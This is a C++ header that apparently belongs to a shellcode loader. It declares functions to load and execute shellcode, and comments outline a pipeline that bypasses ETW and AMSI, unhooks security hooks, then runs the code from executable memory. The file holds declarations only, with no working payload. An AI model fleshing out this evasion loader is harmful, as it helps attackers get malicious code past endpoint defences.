#ifndef CORE_LOADER_H
#define CORE_LOADER_H

/**
 * PSEUDO — loader.h
 * Main shellcode loader interface.
 * Orchestrates bypass layers then executes shellcode.
 */

#include "types.h"
#include <cstdint>
#include <cstddef>

namespace core {

class Loader {
public:
    // Initialize all enabled bypass modules
    Result initialize(const ModuleConfig& config);

    // Load and execute shellcode from file
    Result load_from_file(const char* filepath);

    // Load and execute shellcode from memory buffer
    Result load_from_buffer(const uint8_t* shellcode, size_t size);

    // Cleanup
    void shutdown();

private:
    // PSEUDO: internal pipeline steps
    // 1. Run enabled bypass layers (static → etw → amsi → unhook)
    // 2. Decrypt/decode shellcode if encoded
    // 3. Allocate executable memory
    // 4. Copy shellcode
    // 5. Execute via chosen technique
    ModuleConfig config_{};
    bool initialized_ = false;
};

} // namespace core

#endif // CORE_LOADER_H
